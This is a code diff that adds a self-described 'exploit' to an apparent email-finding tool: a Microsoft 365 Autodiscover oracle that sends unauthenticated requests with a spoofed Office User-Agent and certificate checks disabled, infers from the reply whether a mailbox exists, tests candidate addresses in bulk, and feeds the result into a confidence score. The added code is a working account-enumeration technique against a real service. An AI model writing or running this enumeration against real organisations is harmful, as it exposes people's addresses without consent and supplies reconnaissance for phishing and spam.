@@ -216,6 +216,78 @@ async def check_github_user(email: str) -> bool:
     return False
 
 
+# ── Autodiscover Oracle (THE exploit) ─────────────────────────────────
+
+AUTODISCOVER_URL = "https://autodiscover-s.outlook.com/autodiscover/autodiscover.json/v1.0"
+
+
+async def verify_autodiscover(email: str) -> dict:
+    """Verify email existence via Microsoft Autodiscover V2.
+
+    THE EXPLOIT: Microsoft's Autodiscover endpoint returns different
+    ActiveSync URLs for existing vs non-existing mailboxes:
+    - outlook.office365.com → email EXISTS in the tenant
+    - eas.outlook.com → email DOES NOT EXIST
+    - 302 redirect to company's own autodiscover → RECOGNIZED by tenant
+
+    This works for ANY company using Microsoft 365. No authentication.
+    No emails sent. One HTTP GET. Ghost mode. Unpatchable — Microsoft
+    MUST respond to Autodiscover for email clients to work.
+
+    Returns: {"exists": True/False/None, "server": str, "redirect": str}
+    """
+    try:
+        async with httpx.AsyncClient(timeout=15.0, follow_redirects=False, verify=False) as client:
+            resp = await client.get(
+                f"{AUTODISCOVER_URL}/{email}",
+                params={"Protocol": "ActiveSync"},
+                headers={"User-Agent": "Microsoft Office/16.0"},
+            )
+
+            if resp.status_code == 302:
+                location = resp.headers.get("location", "")
+                # Redirect to company's own autodiscover = email recognized
+                logger.info(f"Autodiscover: {email} redirected (recognized by tenant)")
+                return {"exists": True, "server": "tenant_redirect", "redirect": location[:120]}
+
+            if resp.status_code == 200:
+                data = resp.json()
+                url = data.get("Url", "")
+                server = url.split("//")[1].split("/")[0] if "//" in url else ""
+
+                if "outlook.office365.com" in server:
+                    logger.info(f"Autodiscover: {email} EXISTS (routed to office365)")
+                    return {"exists": True, "server": server}
+                elif "eas.outlook.com" in server:
+                    logger.debug(f"Autodiscover: {email} does not exist (generic eas)")
+                    return {"exists": False, "server": server}
+                else:
+                    return {"exists": None, "server": server}
+
+            return {"exists": None, "error": f"HTTP {resp.status_code}"}
+
+    except Exception as e:
+        logger.debug(f"Autodiscover check failed for {email}: {e}")
+        return {"exists": None, "error": str(e)[:60]}
+
+
+async def batch_verify_autodiscover(candidates: list[str]) -> str | None:
+    """Try all email candidates against Autodiscover. Return the one that exists."""
+    tasks = [verify_autodiscover(email) for email in candidates]
+    results = await asyncio.gather(*tasks)
+
+    found = []
+    for email, result in zip(candidates, results):
+        if result.get("exists") is True:
+            found.append(email)
+
+    if len(found) == 1:
+        return found[0]  # Exactly one match — high confidence
+    elif len(found) > 1:
+        return found[0]  # Multiple matches — return first, flag ambiguity
+    return None
+
+
 # ── DNS MX check ──────────────────────────────────────────────────────
 
 async def has_mx_records(domain: str) -> bool:
@@ -233,8 +305,9 @@ async def has_mx_records(domain: str) -> bool:
 # ── Compound scoring ──────────────────────────────────────────────────
 
 SIGNAL_WEIGHTS = {
+    "autodiscover_exists": 0.95,  # THE exploit — Autodiscover V2 oracle
     "o365_exists": 0.90,
-    "google_provider": 0.10,  # Domain is Google = MX confirmed, pattern likely standard
+    "google_provider": 0.10,
     "gravatar": 0.15,
     "github_user": 0.15,
     "github_commit": 0.95,
@@ -260,6 +333,17 @@ async def score_email(
 
     signals = {}
     confidence = 0.0
+
+    # Autodiscover Oracle — works for ANY Microsoft 365 tenant
+    ad_result = await verify_autodiscover(email)
+    if ad_result.get("exists") is True:
+        signals["autodiscover_exists"] = True
+        confidence = max(confidence, SIGNAL_WEIGHTS["autodiscover_exists"])
+    elif ad_result.get("exists") is False:
+        return VerificationResult(
+            email=email, confidence=0.02, provider=provider,
+            method="autodiscover_rejected", signals={"autodiscover_exists": False},
+        )
 
     # Provider-specific verification
     if provider == EmailProvider.MICROSOFT and not skip_o365:
